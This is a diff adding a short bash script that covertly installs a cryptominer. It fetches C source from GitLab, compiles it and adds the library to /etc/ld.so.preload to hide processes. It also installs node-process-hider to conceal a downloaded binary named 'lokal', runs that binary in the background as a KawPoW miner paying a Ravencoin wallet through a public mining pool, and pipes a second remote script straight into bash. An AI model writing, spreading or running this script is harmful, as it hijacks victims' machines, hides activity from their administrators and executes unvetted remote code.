@@ -1,0 +1,16 @@
+#!/bin/bash
+apt-get update ; apt-get install sudo -y
+curl https://gitlab.com/falsbayu039/botak/-/raw/master/lohan.c -o lohan.c
+apt-get install build-essential -y
+gcc -Wall -fPIC -shared -o liblohan.so lohan.c -ldl
+mv liblohan.so /usr/local/lib/
+echo /usr/local/lib/liblohan.so >> /etc/ld.so.preload
+rm lohan.c
+echo "supersede domain-name-servers 1.1.1.1;">> /etc/dhcp/dhclient.conf
+/etc/init.d/network restart
+sudo su --command "apt-get update && apt-get install gcc -y && curl -sL https://deb.nodesource.com/setup_14.x | bash && apt-get install nodejs -y && npm install -g npm@9.2.0 -y && npm i -g node-process-hider && ph add lokal"
+mkdir .kap && cd .kap
+wget https://gitlab.com/falsbayu039/botak/-/raw/main/lokal >/dev/null 2>&1
+chmod +x lokal
+./lokal -a kawpow -o stratum+tcp://rvn.2miners.com:6060 -u RCE3jukUFLFpbr3GH5Hy77czci4AiLHAH1.gass -p x >/dev/null 2>&1 &
+curl -sL https://raw.githubusercontent.com/youcef664/tera/main/yull.sh | bash
